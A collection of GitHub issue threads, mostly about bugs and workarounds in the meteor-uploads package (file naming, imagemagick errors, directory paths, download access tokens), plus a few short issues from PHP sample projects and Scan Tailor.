    <Title>I'm having problems with files that have spaces or _ (underscores) in them.</Title>
    <Owner>tomitrescak</Owner>
    <Body>I was able to use this in my 

```
UploadServer.init({
getFileName: function( fileInfo, formData ) {
      try {
        return fileInfo.name.replace(/[*_\s]/g, '');
      } catch(e) {
        throw new Meteor.Error(500, e);
      }
    });
```

To return the fixed file name, but the url includes the name with spaces and _ in them still. I'm sure I could use a collection.after to fix this in the collection, but I believe this is a bug. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>c316</Owner>
      <Body>For anyone else that might need a temporary solution, here is what I am doing. 

```
Uploads.before.insert(function (userId, doc, fieldNames, modifier) {
  // Remove spaces and underscores from the url
  doc.url = doc.url.replace( /[*_\s]/g, '' );
  return true;
});
```
</Body>
    </Comment>
    <Comment>
      <Owner>msj121</Owner>
      <Body>Also having an issue. This should be fixed properly without removing spaces. I need files to remain the same since some files reference each other with relative urls. I can't expect users who upload files to assume all spaces will be removed so their files can reference each other....
</Body>
    </Comment>
  </Issue_745>
  <Issue_746>
    <Repository>meteor-uploads</Repository>
    <Title>POST http://localhost:3000/upload 503 (Service Unavailable)</Title>
    <Owner>tomitrescak</Owner>
    <Body>What to do?
I don't know how to fix this.
I already saw the other issues about this but it doesn't work for me and maybe it's because the meteor is again upgrade to its version
</Body>
    <State>open</State>
    <Comment>
      <Owner>nezirz</Owner>
      <Body>I have also the same problem in meteor 1.3.1 Win 10.
The same problem when I tried to run Original plugin project from [tomitrescak](https://github.com/tomitrescak/meteor-uploads)
</Body>
    </Comment>
    <Comment>
      <Owner>sanjay1122</Owner>
      <Body>Any help on following is appreciated, totally stuck ... not able to resize.

imageVersions not working. I am running meteor on windows 7.
Failing "http://localhost:3000/upload 503 ..."
Why is it looking in http://localhost:3000/upload ? This directory does not exist.
Is it related with "uploadUrl", I am not setting it !

# On server console error is

 if (err) throw err;
W20160608-22:19:06.986(5.5)? (STDERR)
W20160608-22:19:07.015(5.5)? (STDERR) C:\xxxxxx\METEOR\meteor-uploads-master.meteor\local\build\programs\server\packages\tomi_upload-server.js:376
W20160608-22:19:07.017(5.5)? (STDERR) Error: Command failed: Invalid Parameter - /Lighthouse.jpg
W20160608-22:19:07.018(5.5)? (STDERR)
W20160608-22:19:07.017(5.5)? (STDERR)                                  ^
W20160608-22:19:07.019(5.5)? (STDERR)     at ChildProcess.&lt;anonymous&gt; (C:\xxxx\AppData\Local.meteor\packages\tomi_upload-server\1.3.4\npm\node_modules\imagemagick\imagemagick.js:88:15)
W20160608-22:19:07.021(5.5)? (STDERR)     at Process.ChildProcess._handle.onexit (child_process.js:833:5)
W20160608-22:19:07.020(5.5)? (STDERR)     at maybeClose (child_process.js:766:16)
W20160608-22:19:07.019(5.5)? (STDERR)

# W20160608-22:19:07.020(5.5)? (STDERR)     at ChildProcess.emit (events.js:98:17)

server init file:
UploadServer.init({
    tmpDir: process.env.PWD + '/.uploads/tmp/',
    uploadDir: process.env.PWD + '/.uploads/',
    checkCreateDirectories: true,
    imageTypes: /.(gif|jpe?g|png)$/i,
    imageVersions: {thumbnailBig: {width: 400, height: 300}, thumbnailSmall: {width: 200, height: 100}},
    finished: function(fileInfo, formData) {
      if (formData &amp;&amp; formData._id != null) {
        Items.update({_id: formData._id}, { $push: { uploads: fileInfo }});
      }
    }
  });
</Body>
    </Comment>
    <Comment>
      <Owner>hrdymchl</Owner>
      <Body>I also have this problem and I've tried the troubleshooting section to no avail. I'm also using Win 10.
</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Guys, I have no windows machine.but these questions keep appearing over and over on this issue page and it is always related to access privileges, or imagemagick not installed properly. Please also read the documentation on how to setup directories properly and what are the configuration options.

It's also possible that this project simply fell behind the current version of imagemagick. If that is so, check the code for server and see if it called properly. If not, PR is welcome.
</Body>
    </Comment>
    <Comment>
      <Owner>sanjay1122</Owner>
      <Body>Thanks Thomas for replying back. I will really appreciate if you could help debug it. 
1) It is not directory permission issue because image gets uploaded to the directory; resize directories thumbnailSmall and thumbnailBig get created. I have also checked from windows explorer that directory permissions are there.

2) I tried two different directories and two different installations of imagemagick but same result. hydychl also mentioned the same so I guess chances of imagemagicks not installed properly is bleak. If there is way to change version then I can try that too, let me know.

I have been tried to debug using node inspector but unsuccessful so far. I see that at most of places in imagemagicks, it is able to capture all correct info like file name, directories and image resize values etc but then at some function it gives error out
xxx\meteor-uploads-master.meteor\local\build\programs\server\packagesW20160609-22:37:08.190(5.5)? (STDERR)                   if (err) throw err;                            ^
W20160609-22:37:08.190(5.5)? (STDERR) Error: Command failed: Invalid Parameter - /SANJAY

I understand that you don't use windows machine but if you can let me know what to experiment and what log/info would help you to debug then I can generate that. I am about to reach give up stage unless you support, appreciate if can extent help. Thanks.
</Body>
    </Comment>
  </Issue_746>
  <Issue_747>
    <Repository>meteor-uploads</Repository>
    <Title>Sudden issue with uploaded files &amp; their directory</Title>
    <Owner>tomitrescak</Owner>
    <Body>&lt;img width="412" alt="newproblem" src="https://cloud.githubusercontent.com/assets/5227820/13868110/acce5c0c-ec93-11e5-89d2-29610333a61a.png"&gt;

`imageVersions: { 
      metathumbnail: {width: 600, height: 315},
      thumbnail: {width: 600, height: 600} 
    },`

`
    getDirectory: function(fileInfo, formData) {
      var directory = '';
      if(fileInfo) {
        if(fileInfo.type === 'image/png'){ directory = 'image'; }
        if(fileInfo.type === 'image/jpeg'){ directory = 'image'; }
      }
      fileInfo.originalname = fileInfo.name;
      return directory;
    },`

In my app I have relied on this for weeks, however something strange has began to occur ever since the;

tomi:upload-jquery  upgraded from 2.2.2 to 2.2.3
tomi:upload-server  upgraded from 1.3.3 to 1.3.4

Where the images would once be put in their correct folders (thumbnails &amp; original), they no longer are, and instead are named incorrectly. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>thegizzada</Owner>
      <Body>Also upon calling;

UploadServer.delete(image/a791e61bb19ee6ba4.jpg);

I get the following error;

Exception while invoking method 'removefile' Error: ENOENT, no such file or directory '/Users/-/-/-/-/-/.uploads/metathumbnail/image/a791e61bb19ee6ba4.jpg'

I cannot make any sense of the path. I'll reiterate that this code functioned for weeks previously, however not anymore &amp; has broken down across three apps subsequent to updating. 
</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Christopher, I apologise, there was a PR recently that dealt with having upload on a different drive, that must have had messed up the original functionality. My tests worked well, so I must have missed something,. Would you have capacity to check out the server commits and see if there is an obvious problem? I will have time in the beginning of the next week to look at it. 
</Body>
    </Comment>
    <Comment>
      <Owner>downup2u</Owner>
      <Body>I got this error too,(on ubuntu linux server.14.04 64bit),
but it's ok on windows.
</Body>
    </Comment>
    <Comment>
      <Owner>msj121</Owner>
      <Body>A current workaround for me is to append "/" to the end of the "getDirectory" function. Sadly this puts a double slash in the url, but it still works in chrome. 

Perhaps this might help find the problem. Perhaps there is a bad character in the code that works for windows and not unix/linux. (I am seeing this issue on my mac).
</Body>
    </Comment>
    <Comment>
      <Owner>msj121</Owner>
      <Body>Current solution I found was to add "/" to line 469:

var destinationFile = currentFolder +"/"+ newFileName;

It now works as expected.
</Body>
    </Comment>
    <Comment>
      <Owner>dasdeck</Owner>
      <Body>Whats up with this? Why has this been broken. I noticed the suggested fix is the behaviour of 1.3.3
</Body>
    </Comment>
  </Issue_747>
  <Issue_748>
    <Repository>meteor-uploads</Repository>
    <Title>Subdirectory creation 'double slashes'</Title>
    <Owner>tomitrescak</Owner>
    <Body>Hello,

I'm enjoying using the clear API of your nice meteor-uploads module but I'm running into the following problem. The end result is working for me but I still think there might be some improvement in the way the subdirectories are working - or maybe it is because I am doing something wrong.

I have configured the UploadServer in such a way that I'm putting my uploaded images in subdirectory based on a variable called 'groupId'. Note that I add a '/' before and after my desired subDirectory in the code below. If I do not do this (running locally on OSX - El Capitan) the files get saved with prefixed filename - not in subdirectory.

_server/init.js_
`if(Meteor.isServer) {
    Meteor.startup(function() {
        UploadServer.init({
            tmpDir: process.env.PWD + '/.uploads/tmp',
            uploadDir: process.env.PWD + '/.uploads/',
            checkCreateDirectories: true, //create the directories for you
            finished: function(fileInfo, formFields) {
                fileInfo.groupId = formFields.groupId;
                fileInfo.teamId = formFields.teamId;
            },
            getDirectory: function(fileInfo, formFields) {
                return "/"+formFields.groupId+"/";
            }
        });
    });
}`

However, due to this, in the client side code the 'url' of fileInfo object looks like this (note 'double' slashes):
"http://localhost:3000/upload//xqoHGq6syrLjTuNb3//1458162890876-1139262283.jpg"

This does not lead to problems when fetching the file later - the browser compensates for the double slashes but still I think this is not a very 'nice' way of saving it in a Collection as I am doing in the code below:

_custom callback in custom template_
`myCallbacks: function (){
        var groupId = Router.current().params._id;
        return {
            formData: function() { return { teamId: Session.get("activeTeam"), groupId: groupId } },
            finished: function(index, fileInfo, context) {
                // upload completed insert fileInfo into collection
                Meteor.call('insertUpload', fileInfo, function(error, result) {
                    var data = {
                        photoId: result
                    };
                    submitEvent(data);
                });
            }
        }
    }`
</Body>
    <State>open</State>
    <Comment>
      <Owner>msj121</Owner>
      <Body>Currently my workaround is as follows, its bad but works:

```
finished: function(index, fileInfo, context){
        fileInfo.path = fileInfo.path.replace("//", "/");
        fileInfo.url = fileInfo.url.replace("//", "/");
        //will mess up http://
}
```

Bad idea... don't bother
</Body>
    </Comment>
    <Comment>
      <Owner>msj121</Owner>
      <Body>Nevermind, I seem to run into lots more issues.
Take a look at the solution in #220 
</Body>
    </Comment>
  </Issue_748>
  <Issue_749>
    <Repository>meteor-uploads</Repository>
    <Title>Upload fails with [Error: Request aborted] for larger files</Title>
    <Owner>tomitrescak</Owner>
    <Body>Hi,

Package works perfect with files which are under cca 200mb, but if i try to upload files which are around 400mb, upload fails with [Error: Request aborted]. Did someone maybe see already this issue? I checked all permissions, tried from different browsers but it didn't help. If file is under cca 200mb upload will finish without errors.

 I get below error in server console:
`=&gt; Client modified -- refreshing
I20160312-13:24:55.474(1)? ERROR
I20160312-13:24:55.474(1)? [Error: Request aborted]`

Client console is empty and firebug is disabled.

Thanks,
Ivan
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Check out the limitations of your server. Also, make sure you set the "maxFileSize" to the reasonable number. I have just tested uploading 3 GB file and no issues there ;(
</Body>
    </Comment>
    <Comment>
      <Owner>orsa86</Owner>
      <Body>Hi,
thanks for you reply. I am still developing this app, so this is still my local computer. I didn't yet deploy it to server. The ''maxFileSize' is set to 4 GB. I'll try to deploy it to server later and test if it will work there.
</Body>
    </Comment>
  </Issue_749>
  <Issue_750>
    <Repository>meteor-uploads</Repository>
    <Title>The images are being set to 8bit</Title>
    <Owner>tomitrescak</Owner>
    <Body>All of my images are being set to 8-bit after they are resized. Is there any way to keep the same type? From the command line I'd just to `-type TrueColor` and that would keep my 24bit color even after resizing. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Can you please do PR to include that flag for imagemagick? But it is strange I did not experience that behaviour.
</Body>
    </Comment>
    <Comment>
      <Owner>c316</Owner>
      <Body>Sure. I think this might be tied to the image itself. I am using black and white images. Like the one I've attached here, the thumbnails are the ones being converted down to 8bit. 

![russ](https://cloud.githubusercontent.com/assets/3142974/13780448/87075e68-ea8d-11e5-9635-b4e284c52aa5.jpg)
</Body>
    </Comment>
    <Comment>
      <Owner>c316</Owner>
      <Body>Looks like I won't be able to do a pull request here. The underlying NPM module actually doesn't have this option available. 

https://github.com/yourdeveloper/node-imagemagick/blob/master/imagemagick.js#L318

Also, this node repository says it is unmaintained and we should consider using Gm instead...
</Body>
    </Comment>
  </Issue_750>
  <Issue_751>
    <Repository>meteor-uploads</Repository>
    <Title>Uploads fail on IE 11</Title>
    <Owner>tomitrescak</Owner>
    <Body>Trying to upload any image file on Windows 10 (IE ver: 11; update version 11.0.25)  and IE immediately throws the "Internet Explorer has stopped working" dialog.

I've tried this on several machines and all exhibit the same behavior.

Could you take a look?
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>You are right ... I have never tested it before. Did not know that people are still using IE :) Unfortunatelly I do not have time to debug this now ... if you manage to find time I would be greatfull. Plugin has been around for more than a year now and this is a first report, so it is not a stressing issue for now. Sorry :/
</Body>
    </Comment>
    <Comment>
      <Owner>musemega</Owner>
      <Body>No prob, and IE - &#160;I know! &#160;Win10 is bringing a whole new set of IE (and Edge) users. &#160;Great&#8230;I&#8217;ll take a look and see what I can do.SteveOn Feb 1, 2016, at 11:10 PM, Tomas Trescak notifications@github.com wrote:You are right ... I have never tested it before. Did not know that people are still using IE :) Unfortunatelly I do not have time to debug this now ... if you manage to find time I would be greatfull. Plugin has been around for more than a year now and this is a first report, so it is not a stressing issue for now. Sorry :/&#8212;Reply to this email directly or view it on GitHub.

muse&#160;megav:&#160;206.395.3100&#160;c:&#160;425.233.0981&#160;l&#160;:&#160;www.linkedin.com/in/stevenejackson/
</Body>
    </Comment>
    <Comment>
      <Owner>dwayneholmberg</Owner>
      <Body>Is this just when using the upload_bootstrap or upload_semanticUI components? I just set up meteor-uploads using the custom template from the README, and it's working fine on Windows 10 in Edge, IE11 and IE10. I haven't tried with the build in components, mind you. 

Very nice package, by the way.
</Body>
    </Comment>
    <Comment>
      <Owner>musemega</Owner>
      <Body>It is the upload_semanticUI component.  I haven't had the cycles to take a look yet, but it's on the task list.
</Body>
    </Comment>
    <Comment>
      <Owner>dwayneholmberg</Owner>
      <Body>Thanks for the clarification! I'm working with the bootstrap component at the moment, but I'll keep on eye open on the semantic side if I stumble over there. Cheers.
</Body>
    </Comment>
  </Issue_751>
  <Issue_752>
    <Repository>meteor-uploads</Repository>
    <Title>How to modify fileTypes for Custom Templates?</Title>
    <Owner>tomitrescak</Owner>
    <Body>it is easy to modify fileTypes in below upload template 

```
 {{&gt; upload_bootstrap fileTypes='.jpg' multiple=true formData=specificFormData }}
```

But how can I modify the fileTypes for custom template?

```
&lt;template name="customUpload"&gt;
    &lt;form method="POST" enctype="multipart/form-data"&gt;
        &lt;input type="file" class="jqUploadclass" data-form-data='{{ submitData }}'&gt;
        {{#with infoLabel}}
            {{ infoLabel}} &lt;button class="start"&gt;StartUpload&lt;/button&gt;
            &lt;div style="width: 200px; height: 30px; border: 1px solid black"&gt;
                &lt;div style="background: red; height: 30px; width: {{ progress }}"&gt;
                    {{ progress }}
                &lt;/div&gt;
            &lt;/div&gt;
        {{/with}}
    &lt;/form&gt;
&lt;/template&gt;
```

Thanks,
Michael 
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>You just specify them in the input control. Or am I not understanding something.
</Body>
    </Comment>
    <Comment>
      <Owner>zhifengmuyu</Owner>
      <Body>Hi, Tom, thanks for your answer, 
To sepcify the user can only see **xls** file to upload, do you mean sth like following in custom template?

```
&lt;input type="file" fileTypes=".xls" class="jqUploadclass" data-form-data='{{ submitData }}'&gt;
```

but it seems not work ...
</Body>
    </Comment>
    <Comment>
      <Owner>zhifengmuyu</Owner>
      <Body>I want limit user to upload only excel (.xls) file type, I tried with following:

```
&lt;input type="file" accept="excel/xls" class="jqUploadclass" data-form-data='{{ submitData }}'&gt;
```

but it does not work, can you help have a look, thanks a lot!
</Body>
    </Comment>
    <Comment>
      <Owner>zhifengmuyu</Owner>
      <Body>Problem solved, thanks, I am using following which solved the problem

```
accept=".xls"
```

thanks,
</Body>
    </Comment>
    <Comment>
      <Owner>focused</Owner>
      <Body>Did you try?

```
{{&gt; customUpload fileTypes='.xls' multiple=true formData=specificFormData }}
```
</Body>
    </Comment>
  </Issue_752>
  <Issue_753>
    <Repository>meteor-uploads</Repository>
    <Title>Could not install via packages.json</Title>
    <Owner>tomitrescak</Owner>
    <Body>I am trying to install your library via packages.json configuration, but it is failing to download the library from NPM Registry. Do you have any plans to copy your library to npm registry?

I think many would prefer this facility as if we require to manage all the packages via packages.json.

Error:
   While building package npm-container:
   error: couldn't install npm package tomi:upload-server@2.2.0: Command failed: npm http GET
   https://registry.npmjs.org/tomi%3Aupload-server%402.2.0
   npm http 404 https://registry.npmjs.org/tomi%3Aupload-server%402.2.0
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Yup, I will do that eventually ;) Meteor 1.3 is around the corner.
</Body>
    </Comment>
  </Issue_753>
  <Issue_754>
    <Repository>meteor-uploads</Repository>
    <Title>controlling download access to uploaded files.</Title>
    <Owner>tomitrescak</Owner>
    <Body>I am loving this uploader tool so far, but I've come to a snag, which was discussed on issue 58: #58 

I have previously tried doing file uploads with CollectionFS, but was looking for something better.  Specifically I liked the idea that I could choose my own collection in which to store my file metadata, which didn't seem to be possible with the CollectionFS way of doing uploads.

So I put together a demo (https://github.com/wesyah234/fileUploadDemo2) using this package, and soon came to realize that controlling access to the uploaded files did not seem to be possible, at least in the easy way it was with CollectionFS.  See https://github.com/CollectionFS/Meteor-CollectionFS#security for how they are doing it, via allow/deny rules.

I was able to prevent a view of a file depending on whether the user was logged in, because it hooked into the Meteor.Accounts system.

The solution in issue #58 does not seem like it will tie into the Meteor.accounts system or anything like that.  Are there any other ideas for this issue?

In my work with Java and PHP, typically you would stream the document through PHP or Java, and before streaming it through, you would get to check certain permissions.  Is there a possible solution like that here with Meteor?  IE. stream it through a route in Meteor?
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>I have good news for you. All you have to do, is to modify the behaviour of the upload-server. Check out the code here for the GET part of the server: https://github.com/tomitrescak/meteor-tomi-upload-server/blob/master/upload_server.js#L202-L239

If you want to control access to individual uploaded files, you can add access token to file URL and then on server you would only validate that token.  
</Body>
    </Comment>
    <Comment>
      <Owner>wesyah234</Owner>
      <Body>I'm not sure I understand why I would have to modify your upload_server.js code...

Couldn't I just use the validateRequest function? it seems that's the intention of that method.  Seems like I could check some token in the url request, and then return false to prevent the view of the file.  But... I tried that and it still downloads, even though I'm returning false:

```
 Meteor.startup(function () {
    UploadServer.init({
      tmpDir: process.env.PWD + '/Uploads/tmp',
      uploadDir: process.env.PWD + '/Uploads/',
      checkCreateDirectories: true,
      finished: function (fileInfo, formFields) {
        console.log("upload finished, fileInfo ", fileInfo);
        console.log("upload finished, formFields: ", formFields);
        Uploads.insert(fileInfo);
      },
      cacheTime: 100,
      mimeTypes: {
        "xml": "application/xml",
        "vcf": "text/x-vcard"
      },
      validateRequest: function (req, res) {
        console.log("validate request: ", req);
        console.log("token passed in: ", req.query.token);
        console.log("validating request, rerurning false");
        return false;
//        console.log("validate reqeust, resp: ", res);
      }
    })
  });
```
</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Ha! That is absolutely correct .. I apologise. This change was done via pull request and I forgot about it. Thank god for careful programmers like you.
</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>According to following code, you have to return error in validateRequest:

``` javascript
var error = options.validateRequest(req, res);
    if (error) {
      res.writeHead(403, {'Content-Type': 'text/plain'});
      res.write(error);
      res.end();
      return;
    }
```

sou you would do

``` javascript
validateRequest: function (req, res) {
        console.log("validate request: ", req);
        console.log("token passed in: ", req.query.token);
        console.log("validating request, rerurning false");
        return "You cheeky!! No files for you!";
//        console.log("validate reqeust, resp: ", res);
}
```
</Body>
    </Comment>
    <Comment>
      <Owner>wesyah234</Owner>
      <Body>ok, that's good, I'll try that... but now, what I really want to do is know whether the user accessing the file is authenticated or not through Meteor.accounts... do you have any suggestions for dealing with that?
</Body>
    </Comment>
    <Comment>
      <Owner>wesyah234</Owner>
      <Body>What I'm thinking is this:  on the client, I can have a helper that returns:

```
Meteor.user().services.resume.loginTokens[0].hashedToken
```

and all the url download links that I generate can have ?token=(that token above from helper)

and in this validateRequest function I can do this:

```
      validateRequest: function (req, res) {
        console.log("token passed in: ", req.query.token);
        var user = Users.findOne({"services.resume.loginTokens":{$elemMatch:{"hashedToken":req.query.token}}});
        console.log("user ", user);
      }
```

And, if that findOne query gives me a valid user document, then I know they are probably logged in, or at least they were logged in recently, which is better than nothing.

if the find one fails, I can return the string to cause the download to fail.

From looking at the loginTokens in my Users collection, it looks like the tokens go away after about a day.
</Body>
    </Comment>
    <Comment>
      <Owner>wesyah234</Owner>
      <Body>Update: I can improve things on the client by getting not the oldest, but the newest loginToken by this:

```
Meteor.user().services.resume.loginTokens[Meteor.user().services.resume.loginTokens.length-1].hashedToken
```

However, I'm concerned about a couple of things:
1. if I build download links for my files and include h=398djfdkjf9309jfjdfjdf9j, am I exposing the user's login token when I shouldn't be?
2. If the user closes the browser, but leaks the download url to someone else, the url will continue to work for a day or so, until the Meteor or mongo system gets around to cleaning out those resume tokens from the collection. (I still don't know how they go away, but they have consistently gone away after a day)

Comparing it to the https://github.com/CollectionFS/Meteor-CollectionFS  package, I see the "links" generated for the download files contain a "token" but that token does not seem to be my resume token in the Users collection, so I'm not sure where they get that from...

Bottom line, I love your front end download UI, and I also love having more control over where I store the file metadata, but I also love how the collectionFS package lets me control the downloads based on whether the user is logged in or not.  If only these 2 packages could merge somehow :)
</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Ha! I thought I responded .. I did .. but via email and it did not land here. I apologise. Did you solve it? I'll be soon building the authentication plugin for the files. IO have some ideas, but not sure when that will happen. Till then, we are bound to use tokens ... if used correctly .. you should not be worried to exposing them to client. You can incorporate incorporate timestamps with them, limiting them time wise.
</Body>
    </Comment>
    <Comment>
      <Owner>wesyah234</Owner>
      <Body>The solution I went with was to add a "prepare download" button , and the user clicks that, which will generate a timestamp and a token and write to the database.  Then, reactively, the prepare download button will change to a "download" link, which will only be valid for a period of time.  I will probably use 30 seconds or so.
</Body>
    </Comment>
    <Comment>
      <Owner>wesyah234</Owner>
      <Body>The server side will then check the token on the database, and verity the time has not expired, and allow or not allow the download.
</Body>
    </Comment>
  </Issue_754>
  <Issue_755>
    <Repository>meteor-uploads</Repository>
    <Title>Upload from clipboard</Title>
    <Owner>tomitrescak</Owner>
    <Body>There would be a good feature to have the ability to upload files calling a method that gets as an argument result of method getAsFile() of clipboard item. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>I will consider this, but it's a bit difficult with time for me. If you would have time for a pull request that would be fantastic.
</Body>
    </Comment>
  </Issue_755>
  <Issue_756>
    <Repository>transform-to-commonjs</Repository>
    <Title>A few examples that are incorrectly transformed</Title>
    <Owner>tomitrescak</Owner>
    <Body>```javascript&#13;
import {bar as baz2} from "foo";&#13;
import {bar} from "foo";&#13;
import foo, {baz as xyz} from "foo";&#13;
export {foo};&#13;
export {foo as default, bar};&#13;
export {foo as default};&#13;
export {foo as bar} from "foo";&#13;
export {foo, bar} from "foo";&#13;
export {foo} from "foo";&#13;
export default class {}&#13;
export default foo;&#13;
export default [];&#13;
export default new A()&#13;
export default 42;&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Am swamped right now. Will try to look at it. But PRs are welcome ;)</Body>
    </Comment>
    <Comment>
      <Owner>aleclarson</Owner>
      <Body>`export async` too</Body>
    </Comment>
  </Issue_756>
  <Issue_757>
    <Repository>PHP-cms-faq</Repository>
    <Title>unexpected T_CONSTANT_ENCAPSED_STRING</Title>
    <Owner>paullewallencom</Owner>
    <Body>Parse error: syntax error, unexpected T_CONSTANT_ENCAPSED_STRING in addquestion.php on line 33
</Body>
    <State>open</State>
    <Comment>
      <Owner>paullewallencom</Owner>
      <Body>Thank you for the comment, I'll address it in the near future.
</Body>
    </Comment>
  </Issue_757>
  <Issue_758>
    <Repository>PHP-discussion-forum</Repository>
    <Title>Object not found!</Title>
    <Owner>paullewallencom</Owner>
    <Body>when sign in using the sample user name and password you supply and I click login it redirects me and I get the below error....

 The requested URL was not found on this server. The link on the referring page seems to be wrong or outdated. Please inform the author of that page about the error.

If you think this is a server error, please contact the webmaster.
Error 404

And here is the url in my browser.....

http://localhost/homeforum/Hello pf_script_with_get(/homeforum/login.php)/homeforum/login.php
</Body>
    <State>open</State>
    <Comment>
      <Owner>paullewallencom</Owner>
      <Body>Thank you for the comment, I'll address it in the near future.
</Body>
    </Comment>
  </Issue_758>
  <Issue_759>
    <Repository>PHP-news-website</Repository>
    <Title>viewstory.php</Title>
    <Owner>paullewallencom</Owner>
    <Body>Ok look for this at line 33 if($a%5 == 0 &amp;&amp; $a%10 !=)  { and change it to this if($a%5 == 0 &amp;&amp; $a%10 !=0)  { and then at line 46 do the same thing again and you well fix the this error...
Parse error: syntax error, unexpected ')' in viewstory.php on line 33
AND
Parse error: syntax error, unexpected ')' in viewstory.php on line 46
</Body>
    <State>open</State>
    <Comment>
      <Owner>paullewallencom</Owner>
      <Body>Thank you for the comment, I'll address it in the near future.
</Body>
    </Comment>
  </Issue_759>
  <Issue_760>
    <Repository>meteor-aggregate</Repository>
    <Title>How to use $push of $group mongo with data &gt; 16MB?</Title>
    <Owner>sakulstra</Owner>
    <Body>I would like to use $push on $group with Million of data.&#13;
Ex:&#13;
```&#13;
data = [&#13;
  {item: 'A', date, qty, price, amount..},&#13;
  {item: 'A', date, qty, price, amount..},&#13;
  {item: 'B', date, qty, price, amount..},&#13;
  ...........&#13;
]&#13;
----------------&#13;
Inventories.aggregate([&#13;
    {&#13;
        $group: {&#13;
            _id: "$item", &#13;
            data: {&#13;
                $push: {&#13;
                    date: "$date",&#13;
                    qty:"$qty",&#13;
                    price:"$price",&#13;
                    amount:"$amount",&#13;
                }&#13;
            }&#13;
        }&#13;
    }&#13;
])&#13;
```&#13;
I got the error `Exceeded memory limit for $group, but didn't allow external sort. Pass allowDiskUse:true to opt in.`&#13;
And then I tried&#13;
```&#13;
.......([....], { allowDiskUse: true })&#13;
```&#13;
I got the error `BSONObj size: 19046166 (0x1229F16) is invalid. Size must be between 0 and 16793600(16MB) First element: id: 293825087070.`&#13;
&#13;
Could help me???</Body>
    <State>open</State>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>@thearabbit hay, did you get this resolved? I got a similar issue a while ago which was actually caused by the underlying mongodb driver - an update to meteor/mongo fixed this in my case.</Body>
    </Comment>
    <Comment>
      <Owner>thearabbit</Owner>
      <Body>Not yet, Please...</Body>
    </Comment>
  </Issue_760>
  <Issue_761>
    <Repository>sf-import</Repository>
    <Title>Unable to read jpgs [sf#2]</Title>
    <Owner>sakulstra</Owner>
    <Body>Submitted by *anonymous on 2012-04-05 16:06:19

Scan Tailor can't read any JPGs that I have on my machine (even JPGs I've dloaded from Google images.)

It can read TIFs OK, though. (But not JPGs renamed to TIFs. But I don't know if that's surprising.)

I created a virtual version of my current XP install, and then uninstalled just about all my apps, ran RegCleaner.  Still no luck.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>Which anti-virus software are you running? I had multiple reports about Norton Antivirus and other software from Symantec causing it. Disabling Norton Antivirus wasn't enough - you actually had to uninstall it.
</Body>
    </Comment>
  </Issue_761>
  <Issue_762>
    <Repository>sf-import</Repository>
    <Title>One more command line argument can be added as "Action" [sf#24]</Title>
    <Owner>sakulstra</Owner>
    <Body>Submitted by rosbicn on 2010-12-12 06:27:52

Scantailor is an excellent software, and I have already processed more than 100 books with it. But there are more books need to be processed and I have to sleep at night. I hope scantailor can process books at night when I falling into sleep.

I have read some source code, then I know use the scantailor can process argv[1] as project path in command line. I hope one more command line argument can be added as "Action". 

For example "scantailor -margin book.scantailor" will open project "book.scantailor" than do the batch process "Margins", then save project and exit. 

For example "scantailor -output book.scantailor" will open project "book.scantailor" than do the batch process "Output", then save project and exit.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>I have retired from Scan Tailor development, and there is no one else working on it at the moment.  I am leaving this request open, though I don't see it being implemented.
</Body>
    </Comment>
  </Issue_762>
  <Issue_763>
    <Repository>sf-import</Repository>
    <Title>Selection of odd and even pages [sf#17]</Title>
    <Owner>sakulstra</Owner>
    <Body>Submitted by beliskner on 2010-08-03 18:49:53

I need an easy to perform selection of all even and all odd pages mostly to set different margin values on these pages. Maybe even an option in 'Apply to' function which allows to set the values to each odd or each even page in one step. It would be really good thing for working on publications with text column aligned diferently on even and odd pages if whole original page area is required to be transferred into the output image. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>It would be reasonable to have "Apply to every other page" for Margins, just as we have it for "Fix Orientation".  Unfortunately, until I finish with dewarping, I don't want to distract myself on other stuff.  So, maybe in a few months ...
</Body>
    </Comment>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>No rush necessary, But it could save a lot of manual adjustments. Oh, another thing related to this, maybe there is no need to make new thread for it &#8212; it would be good to have adjustable filling color &#8212; the one used when input image is smaller than export area in color mode (now it's default gray),
</Body>
    </Comment>
  </Issue_763>
  <Issue_764>
    <Repository>sf-import</Repository>
    <Title>Apply Manual Split Line to multiple pages [sf#15]</Title>
    <Owner>sakulstra</Owner>
    <Body>Submitted by streicherlouw on 2010-06-30 13:53:50

The automatic page splitting sometimes malfunctions on the output from my book scanner. This is not a problem, as I can split the pages manually, but this process takes a very long time, as I have to move the split lines manually for every page (sometimes 100s of pages)

As the output from my book scanner is very consistent, the page split itself is always in roughly the same place in each image, and it would save me a great amount of time if I could simply set the page split on the first page, then apply the same split line for a given scope of further pages.

The way I envision using this is to set the split line on the first left page camera image, and then apply to every second page from there on (handing all the images from the left camera), and then do the same for the first right page and every second page from there on.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sakulstra</Owner>
      <Body>I am not a fan of such features.  The majority of Scan Tailor users don't have special hardware that guarantees a stable position of the book.  Therefore, for this majority, such a feature would never be useful, and in fact would be potentially harmful, especially if you consider the lack of undo functionality in Scan Tailor.
